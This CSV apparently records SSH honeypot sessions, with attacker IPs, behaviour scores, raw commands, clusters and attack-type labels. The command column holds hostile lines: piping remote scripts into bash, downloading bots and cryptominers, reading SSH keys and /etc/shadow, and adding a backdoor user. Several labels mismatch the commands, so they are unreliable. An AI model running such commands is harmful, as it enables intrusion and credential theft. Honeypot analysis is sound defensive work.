session_id,src_ip,country,login_attempts,login_success,num_commands,session_duration,dst_port,recon_score,persistence_score,mining_score,lateral_score,exfil_score,has_download,has_chmod,has_cron,has_useradd,raw_commands,cluster,attack_type
f02b499c9caa40bf,159.89.49.114,United States,1,0,0,2,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8488779712944309,211.94.20.175,China,5,1,3,27,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
6ade2e1b6fe94b19,68.183.39.102,United States,5,1,3,26,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
8ac2079061af41a3,91.240.118.172,Ukraine,2,1,2,17,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
0b9e152c561548b5,218.92.0.158,China,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
513b1fe923b240cf,92.255.57.210,Russia,2,1,3,19,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
2bcfd10de3a244df,167.71.13.196,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ff885934e2544f8f,5.188.86.172,Russia,2,1,3,17,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
cf1491ff7dcf45f7,134.209.82.19,United States,5,1,5,35,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
cb630289cabf4b09,80.82.77.139,Netherlands,4,1,3,25,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
7b6b5049fcdd4c47,91.240.118.172,Ukraine,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
53aaf0ec395b4f78,193.32.162.8,Russia,5,1,2,22,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
2e8c62820e2d4ce6,206.189.32.177,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8c1fe911eeba42b8,218.92.0.158,China,3,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
6566a47da1754641,104.236.198.48,United States,2,1,2,24,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
c7110b98b2e74153,218.92.0.158,China,5,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5957c1d1fb864505,58.218.211.36,China,1,1,1,12,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
74c3cfbdc0194d76,68.183.39.102,United States,4,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e02f7eb40f244ab5,198.199.65.32,United States,2,1,2,14,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
ee5a4fe4e07b4975,5.188.86.172,Russia,5,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
1474113296584bec,45.142.212.100,Netherlands,4,1,5,26,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
26c784b787ff4d7a,179.60.150.100,Brazil,3,1,3,27,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
487d0a2af92343d6,164.92.98.77,United States,4,1,2,27,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
a151e051b9df4b1b,206.189.32.177,United States,3,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
d74a64d859b043ad,134.209.82.19,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
61db3f73b32341fe,193.32.162.8,Russia,4,1,3,19,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
c385c8a24c2449d7,138.197.148.152,United States,5,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
b30cd930639a4f51,206.189.32.177,United States,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
dbb3a85e3fb548cf,159.89.49.114,United States,4,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
333374451b03490f,193.32.162.8,Russia,3,1,2,16,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
